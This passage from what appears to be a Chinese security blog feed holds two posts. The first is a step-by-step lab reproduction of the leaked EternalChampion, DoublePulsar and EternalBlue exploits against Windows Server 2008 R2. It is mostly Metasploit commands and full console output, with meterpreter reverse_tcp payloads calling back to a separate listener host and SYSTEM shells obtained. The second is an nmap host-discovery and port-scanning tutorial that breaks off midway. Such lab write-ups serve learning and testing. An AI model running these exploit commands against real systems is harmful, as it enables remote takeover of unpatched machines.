title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(window2003)</th><th>安装FuzzBunch等</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(window2008 r2)</td><td>被攻击</td><td>ip 192.168.1.187</td></tr><tr><td>另一台攻击机(kail)</td><td>监听端口，靶机返回shell到此攻击机</td><td>ip 192.168.1.230    </td></tr></tbody></table><p>工具：winhex </p><h2 id="运行-FuzzBunch"><a href="#运行-FuzzBunch" class="headerlink" title="运行 FuzzBunch"></a>运行 FuzzBunch</h2><p>targetIP写靶机 IP 192.168.1.187，CallBack写本机ip 192.168.1.234，不使用 Redirection<br><img src="/posts/../../images/yongheng/champion/1.png" alt=""> </p><h2 id="smbtouch-探测"><a href="#smbtouch-探测" class="headerlink" title="smbtouch 探测"></a>smbtouch 探测</h2><p>先用smbtouch 探测一下可以利用的模块<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use smbtouch</span><br><span class="line">execute</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/yongheng/champion/2.png" alt=""><br>显示漏洞利用<br><img src="/posts/../../images/yongheng/champion/3.png" alt=""><br>从图中看出可以使用永恒的冠军</p><h2 id="Doublepulsar-生成-shellcode"><a href="#Doublepulsar-生成-shellcode" class="headerlink" title="Doublepulsar 生成 shellcode"></a>Doublepulsar 生成 shellcode</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure><p>这次的测试环境的靶机是64位的，所以系统选择x64<br><img src="/posts/../../images/yongheng/champion/4.png" alt=""><br>一路回车直到 出现 0)OutputInstall的选项，选择0输入文件保存地址，这里我写 c:\shellcode64.bin<br><img src="/posts/../../images/yongheng/champion/5.png" alt=""><br>一直回车 ，最后生成shellcode.bin<br><img src="/posts/../../images/yongheng/champion/6.png" alt=""> </p><h2 id="将-shellcode-转换成-HEX"><a href="#将-shellcode-转换成-HEX" class="headerlink" title="将 shellcode 转换成 HEX"></a>将 shellcode 转换成 HEX</h2><p>因为 EternalChampion 需要的是ShellcodeBuffer而不是ShellcodeFile，所以这里要利用winhex将 Doublepulsar 生成的 shellcode 转换成十六进制,后面要用到。<br><img src="/posts/../../images/yongheng/champion/7.png" alt=""> </p><h2 id="EternalChampion-进行攻击"><a href="#EternalChampion-进行攻击" class="headerlink" title="EternalChampion 进行攻击"></a>EternalChampion 进行攻击</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use EternalChampion</span><br></pre></td></tr></table></figure><p>一直默认回车，直到<code>shellcodeBuffer[]:</code> 将刚才的shellcode64.dll的十六进制的值，粘贴到这里，要一两分钟才能粘贴完，静静等待。<br><img src="/posts/../../images/yongheng/champion/8.png" alt=""><br>在下图我们可以看到永恒的冠军针对的系统还挺多的。<br><img src="/posts/../../images/yongheng/champion/9.png" alt=""><br>然后又是一路回车，到<code>Mode :: Delivery mechanism</code> 选择 FB<br><img src="/posts/../../images/yongheng/champion/10.png" alt=""><br>接下来，还是回车回车回车。<br><img src="/posts/../../images/yongheng/champion/11.png" alt=""><br>复现失败<br>运行<code>execute</code>多次，还是失败，不知道怎么回事，每次到 这里都没有成功过。不管了，看下面能否成功。</p><h2 id="生成dll-2"><a href="#生成dll-2" class="headerlink" title="生成dll"></a>生成dll</h2><p><img src="/posts/../../images/yongheng/champion/12.png" alt=""><br>将生成的dll复制到window2003中</p><h2 id="kail监听-1"><a href="#kail监听-1" class="headerlink" title="kail监听"></a>kail监听</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span>  payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:6666</span><br></pre></td></tr></table></figure><h2 id="使用-Doublepulsar-注入-dll"><a href="#使用-Doublepulsar-注入-dll" class="headerlink" title="使用 Doublepulsar 注入 dll"></a>使用 Doublepulsar 注入 dll</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use DoublePulsar</span><br></pre></td></tr></table></figure><p>然后到<code>function</code> 选择<code>2)Run DLL</code>，输入 dll 文件路<br><img src="/posts/../../images/yongheng/champion/14.png" alt=""><br>然后运行，回车默认，这里还是失败了。<br>试了很多的机子都没有成功。无奈！</p><h1 id="msf的利用模块"><a href="#msf的利用模块" class="headerlink" title="msf的利用模块"></a>msf的利用模块</h1><h2 id="测试环境-3"><a href="#测试环境-3" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(kail)</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(window2008 R2)</td><td>ip 192.168.1.238</td></tr></tbody></table><h2 id="ms17-010-eternalblue"><a href="#ms17-010-eternalblue" class="headerlink" title="ms17_010_eternalblue"></a>ms17_010_eternalblue</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; search ms17_010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                      Disclosure Date  Rank     Description</span><br><span class="line">   ----                                      ---------------  ----     -----------</span><br><span class="line">   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection</span><br><span class="line">   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; use exploit/windows/smb/ms17_010_eternalblue  </span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:8888 </span><br><span class="line">[*] 192.168.1.187:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.1.187:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.1.187:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.1.187:445 - CORE raw buffer dump (51 bytes)</span><br><span class="line">[*] 192.168.1.187:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class="line">[*] 192.168.1.187:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard </span><br><span class="line">[*] 192.168.1.187:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac</span><br><span class="line">[*] 192.168.1.187:445 - 0x00000030  6b 20 31                                         k 1             </span><br><span class="line">[+] 192.168.1.187:445 - Target arch selected valid <span class="keyword">for</span> arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.1.187:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.1.187:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.1.187:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.1.187:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.1.187:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.1.187:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.1.187:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.1.187:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.1.187:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.1.187:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.1.187:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.230:8888 -&gt; 192.168.1.187:54937) at 2018-06-01 20:11:08 -0400</span><br><span class="line">[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:3c:07:87</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.1.187</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:ba70:f4ff:0:bea</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">IPv6 Address : fe80::64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><h2 id="ms17-010-psexec"><a href="#ms17-010-psexec" class="headerlink" title="ms17_010_psexec"></a>ms17_010_psexec</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> lport 7777</span><br><span class="line">lport =&gt; 7777</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:7777 </span><br><span class="line">[*] 192.168.1.187:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1</span><br><span class="line">[*] 192.168.1.187:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.1.187:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 192.168.1.187:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.1.187:445 - Executing the payload...</span><br><span class="line">[+] 192.168.1.187:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.1.230:7777 -&gt; 192.168.1.187:54873) at 2018-06-01 20:04:07 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:3c:07:87</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.1.187</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:ba70:f4ff:0:bea</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">IPv6 Address : fe80::64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><p>本文章主要是操作步骤的，没有太多思路的分析，如果想仔细了解，可以看看以下的参考文章  </p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>永恒之蓝的参考文章:<br><a href="http://www.freebuf.com/articles/system/133853.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/133853.html</a><br><a href="https://www.bennythink.com/shadowbroker.html" target="_blank" rel="noopener">https://www.bennythink.com/shadowbroker.html</a><br>永恒的浪漫的参考文章<br><a href="http://www.freebuf.com/articles/system/132879.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/132879.html</a><br>永恒的冠军的参考文章<br><a href="https://www.bennythink.com/eternalchampion.html" target="_blank" rel="noopener">https://www.bennythink.com/eternalchampion.html</a><br>ms17_010_psexec的简介<br><a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/9473</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自从Shadow Brokers（影子经纪人）泄露NSA(美国安全局)    的大量黑客工具，很多人就开始研究该黑客工具利用利用方式。其中比较出名的利用方式就是WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件就是利用了其中的永恒之蓝进行传播的。一直听着别人的利用方式，今天就去学习复现一下。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>namp工具的细究</title>
    <link href="http://note.cfyqy.com/posts/9cda70be.html"/>
    <id>http://note.cfyqy.com/posts/9cda70be.html</id>
    <published>2018-04-30T09:26:00.000Z</published>
    <updated>2018-09-18T09:31:02.526Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>nmap主机端口开发探测神器，一直在使用它来主机发现和端口开放探测，不知道其原理，这次就来仔细地了解一下它的真面目。</p><a id="more"></a><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><h2 id="基于arp协议"><a href="#基于arp协议" class="headerlink" title="基于arp协议"></a>基于arp协议</h2><p>arp协议位于TCP/IP的协议族的网络层，主要解决逻辑地址和物理地址的转换关系。<br>当目标主机与我们处于同一网段时，使用arp协议扫描速度快，结果也精准。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -PR 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>扫描结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> RP-LINK.lan (192.168.1.1)</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">53/tcp open  domain</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 78:A3:51:11:9A:BA (Shenzhen Zhibotong Electronics)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> LAPTOP-1I94N8QB.lan (192.168.1.128)</span><br><span class="line">Host is up (0.0095s latency).</span><br><span class="line">Not shown: 995 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">5357/tcp open  wsdapi</span><br><span class="line">MAC Address: 98:E7:F4:57:26:48 (Hewlett Packard)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.189</span><br><span class="line">Host is up (0.0069s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.1.189 are closed</span><br><span class="line">MAC Address: 78:36:CC:51:05:C9 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.211</span><br><span class="line">Host is up (0.0052s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.1.211 are closed</span><br><span class="line">MAC Address: EC:D0:9F:FD:1E:BD (Xiaomi Communications)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> DESKTOP-HTFCR1N.lan (192.168.1.234)</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">443/tcp  open  https</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">902/tcp  open  iss-realsecure</span><br><span class="line">912/tcp  open  apex-mesh</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">MAC Address: A0:D3:7A:6C:61:AA (Intel Corporate)</span><br><span class="line"></span><br><span class="line">dnet: Failed to open device lo0</span><br><span class="line">QUITTING!</span><br></pre></td></tr></table></figure></p><h2 id="基于ICMP协议"><a href="#基于ICMP协议" class="headerlink" title="基于ICMP协议"></a>基于ICMP协议</h2><p>ICMP协议位于TCP/IP协议族中的网络层，是在IP主机、路由器之间传递控制消息。 </p><table><thead><tr><th>ICMP的报文种类</th><th>类型的值</th><th>ICMP报文的类型</th></tr></thead><tbody><tr><td>差错报文</td><td>3</td><td>终点不可到达</td></tr><tr><td></td><td>4</td><td>源抑制</td></tr><tr><td></td><td>11</td><td>超时</td></tr><tr><td></td><td>12</td><td>参数失灵</td></tr><tr><td></td><td>5</td><td>重定向</td></tr><tr><td>查询报文</td><td>8或0</td><td>响应请求或应答</td></tr><tr><td></td><td>13或14</td><td>时间戳请求或应答</td></tr><tr><td></td><td>17或18</td><td>地址掩码请求或应答</td></tr><tr><td></td><td>10或9</td><td>路由器询问或通告</td></tr></tbody></table><p>1.ICMP响应请求和应答<br>用来测试发送和接收两端链路及目标主机TCP/IP协议是否正常。<br>-PE 和ping实质上一样<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PE 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>2.ICMP时间戳请求和应答<br>ICMP时间戳允许系统向另外一个系统查询当前时间。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PP 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>3.地址掩码请求和应答。<br>ICMP地址掩码请求用源主机发送，用于无盘系统在引导过程中获取自己的子网掩码。大多数主机在收到请求时都发送一个应答。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PM 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><h2 id="基于TCP-IP协议"><a href="#基于TCP-IP协议" class="headerlink" title="基于TCP/IP协议"></a>基于TCP/IP协议</h2><p>1.TCP位于传输层的协议,面向连接可口的、基于字节流的传输层控制协议。<br><img src="/posts/../../images/zhahun/4.jpg" alt=""><br>1）TCP SYN扫描<br>向目标主机发送一个SYN标志的数据包（内容为空，默认端口80）<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PS[端口号(默认为80)] 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> RP-LINK.lan (192.168.1.1)</span><br><span class="line">Host is up (0.028s latency).</span><br><span class="line">MAC Address: 78:A3:51:11:9A:BA (Shenzhen Zhibotong Electronics)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> PLK-AL10-ec350dc5c6e55ec3.lan (192.168.1.105)</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">MAC Address: F8:23:B2:8E:8A:D1 (Huawei Technologies)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.128</span><br><span class="line">Host is up (0.028s latency).</span><br><span class="line">MAC Address: 98:E7:F4:57:26:48 (Hewlett Packard)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.211</span><br><span class="line">Host is up (0.079s latency).</span><br><span class="line">MAC Address: EC:D0:9F:FD:1E:BD (Xiaomi Communications)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> DESKTOP-B0PU34P.lan (192.168.1.214)</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">MAC Address: 44:6D:57:ED:08:3C (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> HUAWEI_MAIMANG_5.lan (192.168.1.241)</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">MAC Address: 00:5A:13:AD:6E:D7 (Huawei Technologies)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> DESKTOP-RG8DNUJ.lan (192.168.1.225)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (7 hosts up) scanned <span class="keyword">in</span> 39.62 seconds</span><br></pre></td></tr></table></figure></p><p>2）<br>2.TCP ACK<br>向目标主机发送一个TCP/ACK数据包，存活的主机会返回一个RST数据包。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PA 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>2.UDP协议<br>udp协议非面向连接的，不可靠的简单的传输层协议。当一个dup端口收到一个udp数据包时，如果是关闭的，就会给源端口发回一个ICMP端口不可达数据包，如果是开放的，就会丢弃这个数据包，不返回任何信息。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PU 192.168.1.0.24</span><br></pre></td></tr></table></figure></p><h2 id="基于SCTP协议6"><a href="#基于SCTP协议6" class="headerlink" title="基于SCTP协议6"></a>基于SCTP协议6</h2><p>SCTP是传输层上的协议,与TCP完成的任务是相同的。 但存在很大 不同 </p><table><thead><tr><th>tcp</th><th>sctp</th></tr></thead><tbody><tr><td>单地址连接</td><td>多地址连接</td></tr><tr><td>基于字节流</td><td>基于消息流</td></tr><tr><td>只能支持一个流</td><td>同时支持多个流</td></tr><tr><td>通过三次握手实现连接</td><td>通过四次握手实现连接</td></tr></tbody></table><p>支持stcp协议的主机并不多，不建议使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PY 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><h2 id="使用IP协议"><a href="#使用IP协议" class="headerlink" title="使用IP协议"></a>使用IP协议</h2><p>所有的tcp udp icmp IGMP数据都是以ip数据包格式传输。 数据包中协议域的长度为8位，标识哪个协议想ip发送数据，ICMP为1,IGMP为2，TCP为6，UDP为7。<br><img src="/posts/../../images/zhahun/5.png" alt=""><br>nmap默认使用ICMP(1) IGMP(2) IP-IN-IP(4)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PO 192.168.1.0/24</span><br><span class="line">```  </span><br><span class="line"><span class="comment">## nmap中dns协议  </span></span><br><span class="line">1.nmap默认只会对活跃的主机进行dns转换，强制所有主机无论是否活跃都做dns转换可用-R</span><br><span class="line">```bash</span><br><span class="line">nmap -R 45.32.7.5-24</span><br></pre></td></tr></table></figure></p><p>2.ip都转换为域名会耗费大量时间，无须转换用-你<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n 45.32.7.5-24</span><br></pre></td></tr></table></figure></p><h2 id="主机发现技术分析"><a href="#主机发现技术分析" class="headerlink" title="主机发现技术分析"></a>主机发现技术分析</h2><p>–packet-trace可以通过它就可以观察nmap发出的数据包和收到的数据包。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PS 192.168.1.0/24</span><br><span class="line">``` </span><br><span class="line">观察结果时，发现nmap没有发送syn数据包。原来nmap的设计思路时: 先 判断目标主机与nmap所在的主机是否在同一网段，如果相同的话，则直接使用ARP扫描模式。  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描  </span></span><br><span class="line"><span class="comment">## 端口的分类  </span></span><br><span class="line">公认端口(Well Known Ports)   </span><br><span class="line">即一般意义上的常用端口。从0到1024；这些端口通常紧密地绑定在一些特定的系统服务中。  </span><br><span class="line">注册端口(Registered Ports)</span><br><span class="line">指的是从1025到49151的端口。松散着绑定一些服务。这些端口大部分没有明确定义服务对象，而且程序可以通过自己的需要定义使用哪些端口，很多远程控制软件和木马程序都会使用它们。  </span><br><span class="line">动态或私有端口( Dynamic or Private Ports)  </span><br><span class="line">49152到65535。正常情况下服务不会被分配到这些端口上，但很多木马喜欢。 </span><br><span class="line"><span class="comment">## 端口状态的定义  </span></span><br><span class="line">open:表明该端口有应用程序接收TCP链接或者UDP报文。 </span><br><span class="line">closed:端口可访问，可以接受nmap探测报文并做出响应。相比较而言没有应用程序在端口监听。 </span><br><span class="line">filtered:设备过滤了数据包，设备可能是路由器、防火墙甚至专门的软件。  </span><br><span class="line">unfiltered： 目标端口是可以访问的，但是无法判断open还是closed.（ACK扫描时才会出现）   </span><br><span class="line">open|filtered:无法确定端口是开放的还是被过滤了，开放的端口不响应就是一个例子。  </span><br><span class="line">closed|filtered: 无法确定端口是关闭还是被过滤了。只有在使用idle扫描时才会发生这种情况。  </span><br><span class="line"><span class="comment">## 端口扫描方法 </span></span><br><span class="line"><span class="comment">### SYN扫描  </span></span><br><span class="line">nmap默认的扫描方式，扫描极快，一秒钟可以扫描上千个端口，也不会在主机上留下扫描痕迹。     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 目标主机应答| 端口状态</span><br><span class="line">---|---</span><br><span class="line">SYN/ACK|open</span><br><span class="line">RST|closed</span><br><span class="line">没有应答|过滤</span><br><span class="line">ICMP无法抵达错误（类型3，代码1，2，3，4，10，13）|filtered </span><br><span class="line">```bash</span><br><span class="line">nmap -sS 45.32.8.31</span><br><span class="line">``` </span><br><span class="line"><span class="comment">### Tcp Connect扫描  </span></span><br><span class="line">跟syn扫描类似，只是完成 了tcp的三次握手。  </span><br><span class="line">```bash</span><br><span class="line">nmap -sT 45.32.8.31</span><br></pre></td></tr></table></figure></p><h3 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h3><p>相当慢<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU 45.32.8.31</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>目标主机应答</th><th>端口状态</th></tr></thead><tbody><tr><td>UDP应答</td><td>open</td></tr><tr><td>没有应答</td><td>open 或者filtered</td></tr><tr><td>ICMP端口无法抵达错误（类型3，代码3）</td><td>closed</td></tr><tr><td>ICMP无法抵达错误（类型3，代码1，2，9，10，13）</td><td>filtered  </td></tr></tbody></table><h3 id="TCP-FIN扫描"><a href="#TCP-FIN扫描" class="headerlink" title="TCP FIN扫描"></a>TCP 